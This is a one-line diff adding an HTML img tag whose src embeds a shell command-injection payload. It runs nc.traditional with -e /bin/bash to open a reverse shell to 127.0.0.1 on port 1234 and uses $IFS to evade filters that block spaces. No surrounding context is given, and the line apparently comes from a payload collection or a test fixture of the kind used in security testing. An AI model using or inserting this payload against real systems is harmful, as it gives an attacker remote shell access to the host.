@@ -1,0 +1,1 @@
+<img src=http://127.0.0.1/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'127.0.0.1'$IFS'1234')>
